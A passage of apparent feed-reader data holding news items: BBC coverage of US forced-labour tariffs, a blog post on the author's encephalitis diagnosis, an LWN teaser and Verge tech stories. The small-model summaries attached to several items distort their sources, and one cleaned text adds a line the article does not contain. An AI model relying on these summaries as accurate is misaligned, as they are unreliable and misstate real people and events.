International&#39;s<b id=""> </b>business and human rights director Peter Frankental told the BBC that &#34;trade measures can play a role in addressing forced labour risks, but they are not a substitute for effective enforcement, corporate accountability and mandatory human rights due diligence.&#34;</p></div><div data-component="text-block"><p>He added: &#34;The UK government urgently needs to get its own house in order; on that front, there remains significant room for improvement.&#34;</p></div><div data-component="text-block"><p>The UK&#39;s Independent Anti-Slavery Commissioner said &#34;the UK law does not go far enough to tackle forced labour in supply chains&#34;.</p></div><div data-component="text-block"><p>It calculates the UK imports around £20bn of goods each year that may be linked to forced labour.</p></div><div data-component="text-block"><p>Canadian Prime Minister Mark Carney said the new tariffs were &#34;not a surprise&#34; and would not impact the vast majority of Canadian exports to the US.</p></div><div data-component="text-block"><p>China said it opposed any form of unilateral tariff, and denied allegations of forced labour.</p></div><div data-component="text-block"><p>&#34;There is no so-called forced labour in China, and we oppose using this as an excuse for political manipulation,&#34; Chinese foreign ministry spokesperson Mao Ning said.</p></div><div data-component="text-block"><p>But several international human rights have said forced labour does exist in China, particularly among Muslim ethnic minorities in Xinjiang.</p></div><div data-component="text-block"><p>The European Commission said the EU remained committed to the trade deal agreed with the Trump administration last year.</p></div><div data-component="text-block"><p>&#34;The EU considers tariffs imposed on these grounds to be unjustified,&#34; a spokesperson said. </p></div><div data-component="text-block"><p>Ajay Srivastava of the Delhi-based think tank Global Trade Research Initiative said India should challenge the legal basis of the proposed tariffs, arguing they stretch the scope of Section 301 - a US trade law that allows Washington to investigate and penalise foreign trade practices deemed unfair.</p></div><div data-component="text-block"><p>The move appeared to be part of &#34;broader US pressure tactics&#34;, he said, and should be kept separate from ongoing trade negotiations.</p></div><div data-component="text-block"><p>&#34;India should reassess its participation and consider stepping away from the bilateral trade agreement, as Malaysia has done,&#34; Srivastava said.</p></div><div data-component="text-block"><p>The Trump administration has not announced new tariffs since February when the Supreme Court ruled the so-called &#39;Liberation Day&#39; tariffs imposed by Trump on a slew of countries around the world in April 2025 were unlawful.</p></div><div data-component="text-block"><p>Trump called the ruling &#34;terrible&#34; and said the justices who rejected his trade policy were &#34;fools&#34;.</p></div><div data-component="text-block"><p>Immediately after the ruling, Trump announced a 10% temporary global tariff but later said it would be 15%. </p></div><div data-component="text-block"><p>However, the duty came in at 10%, and it has not yet been increased. The measure is due to expire in July, unless extended by Congress.</p></div><div data-component="text-block"><p><i id="additional-reporting-by-soutik-biswas,-india-correspondent,-in-delhi.">Additional reporting by Soutik Biswas, India Correspondent, in Delhi.</i></p></div></article></div></div>`,content_text:`3 hours agoMitchell LabiakBusiness reporterGetty ImagesThe US has announced new tariffs of 10-12.5% on dozens of countries accounting for almost all its imports over concerns they are not doing enough to tackle forced labour.It is the second time President Donald Trump's administration has announced new import taxes since the US Supreme Court struck down many of his previous duties in February.The US Trade Department said these countries will face the tariffs because of their failure to address the importing of goods made with forced labour. The UK said it is tackling forced labour, China denied goods are made with forced labour, and the EU said the tariffs were unjustified.Meanwhile, an India analyst said the move was a pressure tactic as trade negotiations between the countries continue.Human rights groups say forced labour does exist in China and that the UK and other countries need to do more on making sure firms do not have forced labour in their supply chains.However, they questioned the effectiveness of US tariffs as a way of dealing with the problem.The 60 trading partners listed – including the UK, the EU, Canada, India and Japan – account for almost all of the goods sold to the US.The US government's stance is that trading with countries which buy things made with forced labour is unfair on the US.US Trade Representative Jamieson Greer said it "creates a dynamic where American workers are forced to compete globally on an unlevel playing field".The tariffs announced have not yet been enforced. The Trump administration will need to go through a process to do so.The report into the investigations concluded that 54 of the countries had "failed to impose a legal prohibition on the importation of goods produced wholly or in part with forced labour and to effectively enforce such a prohibition".It said six other trading partners - Canada, the EU, Ecuador, Indonesia, Mexico and Pakistan - had "failed to effectively enforce a forced labour import prohibition".The trade department said it would impose 10% tariffs on imports from Canada, the EU, Britain, Indonesia, Mexico, Pakistan, Argentina, Bangladesh, Cambodia, El Salvador, Guatemala, Indonesia, Malaysia and Taiwan.The remaining 45 countries, which include China and India, would face 12.5% duties.'Unjustified' moveA UK government spokesperson said: "We're tackling forced labour in the UK and in global supply chains to ensure UK businesses are not complicit in forced labour and human rights violations."We continue to engage regularly with the US administration as part of our negotiations, and have made clear the actions we're taking."Amnesty International's business and human rights director Peter Frankental told the BBC that "trade measures can play a role in addressing forced labour risks, but they are not a substitute for effective enforcement, corporate accountability and mandatory human rights due diligence."He added: "The UK government urgently needs to get its own house in order; on that front, there remains significant room for improvement."The UK's Independent Anti-Slavery Commissioner said "the UK law does not go far enough to tackle forced labour in supply chains".It calculates the UK imports around £20bn of goods each year that may be linked to forced labour.Canadian Prime Minister Mark Carney said the new tariffs were "not a surprise" and would not impact the vast majority of Canadian exports to the US.China said it opposed any form of unilateral tariff, and denied allegations of forced labour."There is no so-called forced labour in China, and we oppose using this as an excuse for political manipulation," Chinese foreign ministry spokesperson Mao Ning said.But several international human rights have said forced labour does exist in China, particularly among Muslim ethnic minorities in Xinjiang.The European Commission said the EU remained committed to the trade deal agreed with the Trump administration last year."The EU considers tariffs imposed on these grounds to be unjustified," a spokesperson said. Ajay Srivastava of the Delhi-based think tank Global Trade Research Initiative said India should challenge the legal basis of the proposed tariffs, arguing they stretch the scope of Section 301 - a US trade law that allows Washington to investigate and penalise foreign trade practices deemed unfair.The move appeared to be part of "broader US pressure tactics", he said, and should be kept separate from ongoing trade negotiations."India should reassess its participation and consider stepping away from the bilateral trade agreement, as Malaysia has done," Srivastava said.The Trump administration has not announced new tariffs since February when the Supreme Court ruled the so-called 'Liberation Day' tariffs imposed by Trump on a slew of countries around the world in April 2025 were unlawful.Trump called the ruling "terrible" and said the justices who rejected his trade policy were "fools".Immediately after the ruling, Trump announced a 10% temporary global tariff but later said it would be 15%. However, the duty came in at 10%, and it has not yet been increased. The measure is due to expire in July, unless extended by Congress.Additional reporting by Soutik Biswas, India Correspondent, in Delhi.`,summary:`• The US announced new tariffs of 10-12.5% on dozens of countries accounting for almost all its imports over concerns they are not doing enough to tackle forced labour. The UK said it is tackling forced labour, China denied goods are made with forced labor, and the EU said the tariffs were unjustified. Meanwhile, an India analyst said the move was a pressure tactic as trade negotiations between the countries continue. Human rights groups say forced labor does exist in China and that the UK and other countries need to do more on making sure firms do not have forced labour in their supply chains. The 60 trading partners listed – including the UK, the EU, Canada, India and Japan – account for almost all of the goods sold to the US.`,summary_model:`qwen2.5:0.5b`,image_url:`https://ichef.bbci.co.uk/news/1024/branded_news/8644/live/78de3db0-5f27-11f1-9da4-8b99067aa239.jpg`,published_at:1780499548,fetched_at:1780509343,content_hash:`11221e7468b4eb6ce51727c44090ec2e5d053cc61f0c872d27c1623d2cb931e2`,is_read:!1,is_starred:!0,is_later:!1,dup_count:0},{id:37,feed_id:6,guid:`https://lobste.rs/s/ovbcr4`,url:`https://burntsushi.net/encephalitis/`,title:`burntsushi discusses personal medical diagnosis`,author:`burntsushi.net via carlana`,content_html:`<div id="readability-page-1" class="page"><div role="main">
+      
+
+      <article>
+      <p>I was recently diagnosed with <a href="https://en.wikipedia.org/wiki/Anti-NMDA_receptor_encephalitis">anti-NMDA receptor encephalitis</a>. It is
+an autoimmune disorder where your body’s normally helpful antibodies
+<a href="https://en.wikipedia.org/wiki/Anti-NMDA_receptor_encephalitis#Pathophysiology">start acting strangely</a>. This leads to inflammation in the brain. This
+short blog briefly discusses some of my experience and prognosis.</p>
+<p><strong>Target audience</strong>: Anyone relying on my work for their own projects.</p>
+<p>It all started with flu-like symptoms: heart racing, night sweats, the chills
+and trouble sleeping. But no congestion or cough. I also felt really off
+mentally. A deep sort of anxiety, along with panic attacks, that I had never
+experienced before in my 38 years of life. It was terrifying, especially
+because I had no idea what was causing it. There were no life events or obvious
+triggers that precipitated the psychological symptoms, nor was there any
+obvious biological explanation for the physical symptoms at the time. This was
+only the beginning.</p>
+<p>Over the ensuing weeks my physical symptoms progressed to <a href="https://en.wikipedia.org/wiki/Temporomandibular_joint_dysfunction">chronic jaw pain</a>,
+making it incredibly difficult to eat. I also had problems with my balance.
+As someone who has easily juggled 3 balls and played sports for my entire
+childhood, I couldn’t catch a ball lobbed to me from a few feet away by my
+5 year old son. My psychological symptoms were perhaps even more horrifying
+to me. I had <a href="https://en.wikipedia.org/wiki/Suicidal_ideation">suicidal ideation</a> and suffered from <a href="https://en.wikipedia.org/wiki/Psychosis">psychosis</a>. Specifically,
+delusions and auditory hallucinations.</p>
+<p>The problems with balance and the overwhelming nature of my psychological
+symptoms eventually led me to fall and hit my head. This in turn led myself
+and my wife to decide that I couldn’t be safe at home. And that brought us
+to my first emergency room visit. They cleared me physically and sent me to an
+<a href="https://en.wikipedia.org/wiki/One_Flew_Over_the_Cuckoo%27s_Nest_(novel)">in-patient psychiatric hospital</a>, which, at the time, I welcomed because my
+symptoms had progressed beyond what we could manage at home.</p>
+<p>It is common for anti-NMDA receptor encephalitis to be misdiagnosed as (in
+my case) <a href="https://pmc.ncbi.nlm.nih.gov/articles/PMC8693539/">generalized anxiety disorder</a> or <a href="https://www.cshl.edu/putting-out-a-brain-on-fire/">schizophrenia</a>. Since I had been
+cleared <em>physically</em>, getting out of the psychiatric hospital quickly to see
+a neurologist proved difficult. This was the single point, in retrospect, where
+our health care system let me down. It took a lucky connection with someone who
+happened to be a doctor to get me out of the psychiatric facility and into the
+<a href="https://www.brighamandwomens.org/neurology">neurology department at Brigham and Women’s Hospital</a> in Boston.</p>
+<p>After that, I was in and out of Brigham and Women’s Hospital for almost a
+month. I had several MRIs, a lumbar puncture, EEGs and many more tests. As a
+result of what I now see as a <a href="https://my.clevelandclinic.org/departments/neurological/depts/multiple-sclerosis/ms-approaches/adult-onset-anti-nmda-receptor-encephalitis">life saving treatment protocol</a>, I very quickly
+received <a href="https://my.clevelandclinic.org/health/treatments/ivig-intravenous-immunoglobulin">intravenous immunoglobulin</a> (IVIG) and <a href="https://my.clevelandclinic.org/health/treatments/corticosteroids-glucocorticoids">methylprednisolone</a>, even
+before my diagnosis was known. In particular, MRIs revealed a <a href="https://my.clevelandclinic.org/health/diseases/demyelinating-disease">lesion in my
+brain</a>. However, confirming a diagnosis of anti-NMDA receptor encephalitis
+would come later since it is <a href="https://www.encephalitis.info/types-of-encephalitis/autoimmune-encephalitis/nmdar-antibody-encephalitis/">best done with at least a positive antibody test
+in your cerebral spinal fluid</a>. Results from this specific test typically take
+a couple weeks to come back.</p>
+<p>By the time I received my official diagnosis, the IVIG and steroids had kicked
+in and I was feeling much better, albeit, not nearly at 100%. I’ve since
+continued on a course of steroids that I am now already tapering off of.
+I’m also tapering off of medications I had been prescribed as a result of
+my psychological symptoms, before encephalitis was known to be the cause.
+Moreover, I am now officially in the <a href="https://forpatients.roche.com/en/trials/autoimmune-disorder/autoimmune-encephalitis/a-study-to-evaluate-the-efficacy--safety--pharmacokinet-99237.html">CIELO clinical trial</a> for testing the
+effectiveness of <a href="https://en.wikipedia.org/wiki/Satralizumab">satralizumab</a> in treating anti-NMDA receptor encephalitis.</p>
+<p>While <a href="https://en.wikipedia.org/wiki/Autoimmune_disease#Treatment">autoimmune disorders don’t have a known cure</a>, the <a href="https://pmc.ncbi.nlm.nih.gov/articles/PMC6007532/">prognosis for
+anti-NMDA receptor encephalitis</a> is very good. My doctors have said that it was
+caught early (despite the early tangent into a psychiatric hospital), and that
+this is associated with better long term outcomes. Indeed, I am feeling great
+now and recovery is exceeding my own expectations.</p>
+<p>There is some <a href="https://link.springer.com/article/10.1007/s00415-017-8546-4">speculation that anti-NMDA receptor encephalitis could partially
+explain past accounts of demonic possession</a>. Many of the people in my life,
+close or not, could tell that there was something seriously wrong with
+me. Without science and modern medicine, I can only imagine what kind of
+speculation folks might have ventured for the underlying cause.</p>
+<p>My full story of this disease of chaos is quite long and I’m not sure I will
+ever publish it in full. However, Susannah Cahalan did just that in her book,
+<a href="https://en.wikipedia.org/wiki/Brain_on_Fire"><em>Brain on Fire: My Month of Madness</em></a>. There is also a <a href="https://www.youtube.com/watch?v=zsJ3rePEu0Y">movie adaptation (as
+of June 2026) available for free on YouTube</a>. My disease didn’t progress as
+far as Susannah’s, nor did it do so in the same way. For example, I didn’t
+have any (known) seizures or <a href="https://en.wikipedia.org/wiki/Catatonia">catatonia</a>. The rest of her symptoms, especially
+the psychosis, were quite similar.</p>
+<p>This has been the absolute worst experience of my life, bar none. It is also
+the explanation behind my higher-than-usual inactivity over the last few
+months. But I am slowly getting back into the swing of things with a renewed
+vigor. I’m <em>excited</em> for where the industry is headed and I can’t wait to
+see what things will look like one year from today. I’m so happy that I get
+to be my “normal” self to experience that, which is a stark juxtaposition
+from how I felt just two months ago.</p>
+<p>Finally, I want to express some gratitude to two people in particular.</p>
+<p>First and foremost is my wife, Kaitlyn Brady. She saved my life. She never
+stopped believing that there was some neurological component and she never
+stopped fighting for me. I feel so grateful that she is in my corner. More than
+that, the burden she carried before my diagnosis was known is something that
+is truly remarkable. She wasn’t just there for me when I needed her. She was
+there for our son. She was there for the doctors whenever they called, even
+late into the night. She was there when our basement flooded. And when we all
+caught influenza. I’ll never know how she juggled everything, but I’ll be
+in her debt for the rest of my life.</p>
+<p>Secondly is <a href="https://github.com/charliermarsh">Charlie Marsh</a>. He was patient, understanding and my partner
+through it all. He didn’t just exceed expectations for how you want your
+employer to deal with a serious medical condition, but he went above and beyond
+even that in more ways than one. It’s not often I can say that someone has
+handled a situation perfectly, but the word fits in this case.</p>
+<p>Thank you to my friends, family and doctors as well. Their support during this
+time was unwavering and I’m not sure what would have happened without them.
+“Nothing good” is what a nurse said when I posed that question to her.</p>
+<p>Happy hacking.</p>
+      </article>
+
+      
+
+    </div></div>`,content_text:`I was recently diagnosed with anti-NMDA receptor encephalitis. It is
+an autoimmune disorder where your body’s normally helpful antibodies
+start acting strangely. This leads to inflammation in the brain. This
+short blog briefly discusses some of my experience and prognosis.
+Target audience: Anyone relying on my work for their own projects.
+It all started with flu-like symptoms: heart racing, night sweats, the chills
+and trouble sleeping. But no congestion or cough. I also felt really off
+mentally. A deep sort of anxiety, along with panic attacks, that I had never
+experienced before in my 38 years of life. It was terrifying, especially
+because I had no idea what was causing it. There were no life events or obvious
+triggers that precipitated the psychological symptoms, nor was there any
+obvious biological explanation for the physical symptoms at the time. This was
+only the beginning.
+Over the ensuing weeks my physical symptoms progressed to chronic jaw pain,
+making it incredibly difficult to eat. I also had problems with my balance.
+As someone who has easily juggled 3 balls and played sports for my entire
+childhood, I couldn’t catch a ball lobbed to me from a few feet away by my
+5 year old son. My psychological symptoms were perhaps even more horrifying
+to me. I had suicidal ideation and suffered from psychosis. Specifically,
+delusions and auditory hallucinations.
+The problems with balance and the overwhelming nature of my psychological
+symptoms eventually led me to fall and hit my head. This in turn led myself
+and my wife to decide that I couldn’t be safe at home. And that brought us
+to my first emergency room visit. They cleared me physically and sent me to an
+in-patient psychiatric hospital, which, at the time, I welcomed because my
+symptoms had progressed beyond what we could manage at home.
+It is common for anti-NMDA receptor encephalitis to be misdiagnosed as (in
+my case) generalized anxiety disorder or schizophrenia. Since I had been
+cleared physically, getting out of the psychiatric hospital quickly to see
+a neurologist proved difficult. This was the single point, in retrospect, where
+our health care system let me down. It took a lucky connection with someone who
+happened to be a doctor to get me out of the psychiatric facility and into the
+neurology department at Brigham and Women’s Hospital in Boston.
+After that, I was in and out of Brigham and Women’s Hospital for almost a
+month. I had several MRIs, a lumbar puncture, EEGs and many more tests. As a
+result of what I now see as a life saving treatment protocol, I very quickly
+received intravenous immunoglobulin (IVIG) and methylprednisolone, even
+before my diagnosis was known. In particular, MRIs revealed a lesion in my
+brain. However, confirming a diagnosis of anti-NMDA receptor encephalitis
+would come later since it is best done with at least a positive antibody test
+in your cerebral spinal fluid. Results from this specific test typically take
+a couple weeks to come back.
+By the time I received my official diagnosis, the IVIG and steroids had kicked
+in and I was feeling much better, albeit, not nearly at 100%. I’ve since
+continued on a course of steroids that I am now already tapering off of.
+I’m also tapering off of medications I had been prescribed as a result of
+my psychological symptoms, before encephalitis was known to be the cause.
+Moreover, I am now officially in the CIELO clinical trial for testing the
+effectiveness of satralizumab in treating anti-NMDA receptor encephalitis.
+While autoimmune disorders don’t have a known cure, the prognosis for
+anti-NMDA receptor encephalitis is very good. My doctors have said that it was
+caught early (despite the early tangent into a psychiatric hospital), and that
+this is associated with better long term outcomes. Indeed, I am feeling great
+now and recovery is exceeding my own expectations.
+There is some speculation that anti-NMDA receptor encephalitis could partially
+explain past accounts of demonic possession. Many of the people in my life,
+close or not, could tell that there was something seriously wrong with
+me. Without science and modern medicine, I can only imagine what kind of
+speculation folks might have ventured for the underlying cause.
+My full story of this disease of chaos is quite long and I’m not sure I will
+ever publish it in full. However, Susannah Cahalan did just that in her book,
+Brain on Fire: My Month of Madness. There is also a movie adaptation (as
+of June 2026) available for free on YouTube. My disease didn’t progress as
+far as Susannah’s, nor did it do so in the same way. For example, I didn’t
+have any (known) seizures or catatonia. The rest of her symptoms, especially
+the psychosis, were quite similar.
+This has been the absolute worst experience of my life, bar none. It is also
+the explanation behind my higher-than-usual inactivity over the last few
+months. But I am slowly getting back into the swing of things with a renewed
+vigor. I’m excited for where the industry is headed and I can’t wait to
+see what things will look like one year from today. I’m so happy that I get
+to be my “normal” self to experience that, which is a stark juxtaposition
+from how I felt just two months ago.
+Finally, I want to express some gratitude to two people in particular.
+First and foremost is my wife, Kaitlyn Brady. She saved my life. She never
+stopped believing that there was some neurological component and she never
+stopped fighting for me. I feel so grateful that she is in my corner. More than
+that, the burden she carried before my diagnosis was known is something that
+is truly remarkable. She wasn’t just there for me when I needed her. She was
+there for our son. She was there for the doctors whenever they called, even
+late into the night. She was there when our basement flooded. And when we all
+caught influenza. I’ll never know how she juggled everything, but I’ll be
+in her debt for the rest of my life.
+Secondly is Charlie Marsh. He was patient, understanding and my partner
+through it all. He didn’t just exceed expectations for how you want your
+employer to deal with a serious medical condition, but he went above and beyond
+even that in more ways than one. It’s not often I can say that someone has
+handled a situation perfectly, but the word fits in this case.
+Thank you to my friends, family and doctors as well. Their support during this
+time was unwavering and I’m not sure what would have happened without them.
+“Nothing good” is what a nurse said when I posed that question to her.
+Happy hacking.`,summary:`• I recently experienced anti-NMDA receptor encephalitis, which is an autoimmune disorder where the body's normally helpful antibodies start acting strangely. This leads to inflammation in the brain and can cause a variety of symptoms such as heart racing, night sweats, difficulty sleeping, mental anxiety, and panic attacks.
+• The disease progressed over weeks, causing physical symptoms like chronic jaw pain, difficulty eating, and problems with balance. Symptoms were horrifying to the person who had no idea what was causing them. They had delusions, auditory hallucinations, and suicidal ideation. My doctors prescribed IVIG (immunoglobulin) and methylprednisolone as a treatment.
+• I experienced recovery in two months and have continued on a course of steroids for it to take effect. I'm now in the CIELO clinical trial for testing the effectiveness of satralizumab, which is an anti-NMDA receptor encephalitis drug. I'm grateful for my wife Kaitlyn Brady and Charlie Marsh who took care of me during this time.`,summary_model:`qwen2.5:0.5b`,published_at:1780499230,fetched_at:1780509343,content_hash:`7a2a371f651e7685c1e981f5aa4c0417265f25dc2a4529dac070a42579927b16`,tags:`person`,is_read:!1,is_starred:!1,is_later:!1,dup_count:1},{id:35,feed_id:4,guid:`https://lwn.net/Articles/1075741/`,url:`https://lwn.net/Articles/1075741/`,title:`[$] Open-source security is not a solo activity`,author:`jzb`,content_html:`<p>Over time, many open-source maintainers face the same problem: they
+lack the time to do all of the work that their project needs, and no
+one else is stepping up to provide adequate help. Maintainers, though,
+are often reluctant to throw in the towel. The result is suboptimal
+all around; the maintainer is stressed out, project quality suffers,
+and users face security risks that they may not be fully aware of. At
+the 2026 <a
+href="https://events.linuxfoundation.org/open-source-summit-north-america/">Open
+Source Summit North America</a>, Robin Bender&#160;Ginn spoke about this
+problem, when it might be time for maintainers to pass the torch, and
+the responsibilities of users.`,content_text:`Over time, many open-source maintainers face the same problem: they lack the time to do all of the work that their project needs, and no one else is stepping up to provide adequate help. Maintainers, though, are often reluctant to throw in the towel. The result is suboptimal all around; the maintainer is stressed out, project quality suffers, and users face security risks that they may not be fully aware of. At the 2026 Open Source Summit North America , Robin Bender\xA0Ginn spoke about this problem, when it might be time for maintainers to pass the torch, and the responsibilities of users.`,summary:`• Open-source security is a critical issue that many maintainers struggle with, especially during peak times when they don't have as much free time or resources to tackle all of their projects. Maintainers often fear stepping out of their comfort zones, which can lead to stress, quality issues, and user insecurity. According to Robin Bender Ginn at the 2026 Open Source Summit North America, users should be aware that open-source security is not a solo activity, and maintaining software requires collaboration and teamwork.
+• Open-source security: A critical issue that many maintainers struggle with
+• Many maintainers face a difficult problem during peak times when they lack free time or resources to tackle all of their projects. They may fear stepping out of their comfort zones and causing stress or quality issues for the project, which can lead to user dissatisfaction.
+• Robin Bender Ginn at the 2026 Open Source Summit North America mentioned that users should be aware that open-source security is not a solo activity. Maintainers often face this challenge because they don't have as much free time or resources to tackle all of their projects.`,summary_model:`qwen2.5:0.5b`,published_at:1780498955,fetched_at:1780509343,content_hash:`460dcfc1aeb36683ce18850bb00b485d8436a1e0583dff1e08489f553b0a1915`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:4,feed_id:3,guid:`https://www.theverge.com/?p=941816`,url:`https://www.theverge.com/news/941816/supernatural-health-meta-quest-vr`,title:`Supernatural isn’t dead after all`,author:`Victoria Song`,content_html:`
+
+						
+<figure>
+
+<img alt="" data-caption="DeeDee Henry works out using VR at her home in Ventura, California. | Photo by Maggie Shannon / The Verge" data-portal-copyright="Photo by Maggie Shannon / The Verge " data-has-syndication-rights="1" src="https://platform.theverge.com/wp-content/uploads/sites/2/2026/01/268305_Supernatural_DeeDee_MShannon_0018.jpg?quality=90&#038;strip=all&#038;crop=0,0,100,100" />
+	<figcaption>
+	DeeDee Henry works out using VR at her home in Ventura, California. | Photo by Maggie Shannon / The Verge	</figcaption>
+</figure>
+<p class="has-text-align-none">A few months ago, Meta effectively handed <em>Supernatural</em>, a popular VR fitness game on the Meta Quest, a death sentence. As part of <a href="https://www.theverge.com/news/861295/meta-reality-labs-layoffs-shift-to-wearables">overarching VR layoffs</a>, the company announced the game would no longer get any new content, <a href="https://www.theverge.com/tech/871250/supernatural-meta-vr-fitness-community">enraging its tightly knit, devoted community</a>. Now it looks like <em>Supernatural </em>is getting a second chance. Today, Meta announced in a community post that the game is being spun off into an independent company later this year.</p>
+<p class="has-text-align-none">The new entity will be called Supernatural Health, and will launch as a separate app on the Meta Horizon Store. While Meta did not comment on who would be the CEO of Supernatural Health, Meta spokespers …</p>
+<p><a href="https://www.theverge.com/news/941816/supernatural-health-meta-quest-vr">Read the full story at The Verge.</a></p>
+						`,content_text:`DeeDee Henry works out using VR at her home in Ventura, California. | Photo by Maggie Shannon / The Verge A few months ago, Meta effectively handed Supernatural , a popular VR fitness game on the Meta Quest, a death sentence. As part of overarching VR layoffs , the company announced the game would no longer get any new content, enraging its tightly knit, devoted community . Now it looks like Supernatural is getting a second chance. Today, Meta announced in a community post that the game is being spun off into an independent company later this year. The new entity will be called Supernatural Health, and will launch as a separate app on the Meta Horizon Store. While Meta did not comment on who would be the CEO of Supernatural Health, Meta spokespers … Read the full story at The Verge.`,cleaned_html:`<p>SUMMARY: Meta's announcement of Supernatural Health, an independent company that will be a separate app on Meta Horizon Store.<br>ARTICLE:<br>DeeDee Henry works out using VR at her home in Ventura, California. | Photo by Maggie Shannon / The Verge A few months ago, Meta effectively handed Supernatural, a popular VR fitness game on the Meta Quest, a death sentence. As part of overarching VR layoffs, the company announced the game would no longer get any new content, enraging its tightly knit, devoted community. Now it looks like Supernatural is getting a second chance. Today, Meta announced in a community post that the game will be spun off into an independent company later this year. The new entity will be called Supernatural Health and will launch as a separate app on the Meta Horizon Store. While Meta did not comment on who would be the CEO of Supernatural Health, Meta spokespeople assured us. Read the full story at The Verge.</p>`,summary:`Meta has announced that Supernatural is about to get its own independent company. It's called Supernatural Health and will launch as a separate app on the Meta Horizon Store.
+
+• Meta has announced Supernatural Health, an independent company being spun off from Supernatural
+• The new company will be called Supernatural Health and be launched separately from Meta Horizon Store`,summary_model:`qwen2.5:0.5b`,image_url:`https://platform.theverge.com/wp-content/uploads/sites/2/2026/01/268305_Supernatural_DeeDee_MShannon_0018.jpg?quality=90&strip=all&crop=0,0,100,100`,published_at:1780498800,fetched_at:1780509343,content_hash:`995892277388668ba01b1e6bbb418ac4815423950991d0b5aa4b318f9942a5c1`,tags:`Fitness, Gadgets, News`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:5,feed_id:3,guid:`https://www.theverge.com/?p=942184`,url:`https://www.theverge.com/gadgets/942184/dreame-l20-ultra-audible-bose-soundlink-flex-deal-sale`,title:`Dreame&#8217;s L20 Ultra robovac is an unbeatable deal for $280`,author:`Sheena Vasani`,content_html:`
+
+						
+<figure>
+
+<img alt="Dreame L20 Ultra against a yellow background." data-caption="Dreame’s L20 Ultra robot vacuum can clean itself. | Image: The Verge" data-portal-copyright="Image: The Verge" data-has-syndication-rights="1" src="https://platform.theverge.com/wp-content/uploads/sites/2/2025/08/dreamel20ultra.png?quality=90&#038;strip=all&#038;crop=0,0,100,100" />
+	<figcaption>
+	Dreame’s L20 Ultra robot vacuum can clean itself. | Image: The Verge	</figcaption>
+</figure>
+<p class="has-text-align-none">The<strong> Dreame L20 Ultra </strong>isn’t the company&#8217;s newest model, but it&#8217;s still a great robovac / mop hybrid that offers strong performance while requiring very little day-to-day maintenance thanks to its included trash bin and AI obstacle avoidance. <em>Verge </em>readers can get for its best-ever price right now. Originally $1,400 when it launched in 2023, it’s down to $279 from <a href="https://www.wellbots.com/products/dreametech-l20-ultra-robotic-vacuum">Wellbots</a> with code <strong>L20VERGE</strong>.</p>
+<div class="product-block"><h3>Dreame L20 Ultra</h3>
+<figure class="product-image"><img width="300" height="200" src="https://platform.theverge.com/wp-content/uploads/sites/2/chorus/uploads/chorus_asset/file/25101726/2023_10_23_10.16.02.jpeg?w=300" class="attachment-medium size-medium" alt="" /></figure>
+<h3>Where to Buy:</h3><ul><li><a href="https://www.wellbots.com/products/dreametech-l20-ultra-robotic-vacuum"> <strike>$1399.99</strike> $279.99 at <strong>Wellbots (with code L20VERGE)</strong></a></li></ul></div>
+<p class="has-text-align-none">What makes the L20 Ultra so great at this price is that it can do a lot on its own — <em>so </em>much more than other robovacs at this price point. The included base station automatically empties the vacuum’s dustbin, washes and dries the mop pads, and refills the robot&#8217;s water tank between cleaning sessions. The L20 Ultra also offers reliable AI-powered obstacle avoidance and can quickly map your home’s layout, meaning you don’t need to babysit it as it cleans. Thanks to its large dust bin, you can ignore it for up to 75 days without having to empty it yourself.&nbsp;</p>
+
+<p class="has-text-align-none">The robovac does a good job of cleaning up carpets and hardwood floors alike, thanks to its 7,000Pa of suction power. What’s more, its dual oscillating mop pads extend when needed to clean along baseboards and in corners. It can lift the mop pads over carpets, or return to its base station to have them removed. </p>
+
+<p class="has-text-align-none">Of course, being a three-year-old robot vacuum, it lacks some of the upgrades found on newer models. For example, the $1,349.99 ($150 off) <a href="https://www.bestbuy.com/product/dreame-x60-ultra-kit-robot-vacuum-and-mop-3-13in-ultra-thin-35kpa-suction-self-emptying-refilling-mop-cleaning-white/J3R8FSV64V/sku/12615446">Dreame X60</a> — <a href="https://www.theverge.com/gadgets/932425/best-robot-vacuum-mop-reviews-buying-guide">currently one of our favorite robovacs</a> — offers a whopping 35,000Pa of suction, two rubber brushes, and a motorized swing arm that can climb over taller thresholds between rooms. Even without them, the L20 Ultra still offers a lot of premium features that aren’t typically offered at this price.</p>
+
+<div id="hype-desk-root"></div>
+
+  window.HYPE_DESK_CONFIG = {
+    productImageUrl: "https://platform.theverge.com/wp-content/uploads/sites/2/2026/06/corsairddr5.jpg",
+    productImageAlt: "Corsair DDR5 Memory",
+    productTitle: "Corsair DDR5 Memory",
+    shortDescription: "The upgrade your PC has been waiting for.",
+    longDescription:
+      "If your computer has been feeling sluggish lately, your memory might be the culprit. Whether you are gaming, editing, or just someone who has too many browser tabs open at once Corsair’s DDR5 RAM is one of the easiest ways to get noticeably more out of a machine you already own. Faster load times, smoother multitasking, less waiting around while your computer catches up with you. Use code MEMORY15 for 15% off through June 15.",
+    purchaseUrl: "https://go.corsair.com/c/482924/490888/8513?subId1=VergeHypedesk&amp;subId2=Corsair&amp;subId3=Article2&amp;u=https%3A%2F%2Fwww.corsair.com%2Fus%2Fen%2Fc%2Fmemory&amp;partnerpropertyid=7032191",
+    purchaseLinkText: "Get The Deal At Corsair"
+  };
+
+
+
+<hr class="wp-block-separator has-alpha-channel-opacity" />
+
+<h2 class="wp-block-heading">Three more ways to save</h2>
+
+<ul class="wp-block-list">
+<li>Through July 16th at 2:59AM ET, Prime members who are new to Audible can get <a href="https://www.amazon.com/hz/audible/arya/mlp">three months of <strong>Audible Standard</strong> for free</a>, a savings of roughly $27 compared to paying the regular $8.99 monthly price. The plan gives you one credit to purchase a new audiobook each month from Audible’s vast library, which includes bestsellers and classics, and they’re yours to keep forever, even if you end the subscription. You’ll be renewed at the regular $8.99 per month price unless you cancel at the end of the promotional period.</li>
+
+
+
+<li><a href="https://electronics.woot.com/offers/bose-soundlink-flex-portable-speaker-gen-1-certified-refurbished">Woot</a> is selling the <strong>last-gen Bose Soundlink Flex</strong> portable Bluetooth speaker in refurbished condition for $69.99 with a one-year Bose warranty. That’s $80 less than its original retail price. The portable Bluetooth speaker isn’t all that different from the newer model, and can deliver surprisingly expansive sound quality for its size. It also boasts a rugged IP67-rated design for dust and water resistance, and it lasts up to 12 hours on a single charge. Its controls aren’t the most intuitive we’ve used, and it lacks support for higher-res AAC and aptX codecs, but we think those flaws are easy to overlook at this price.</li>
+
+
+
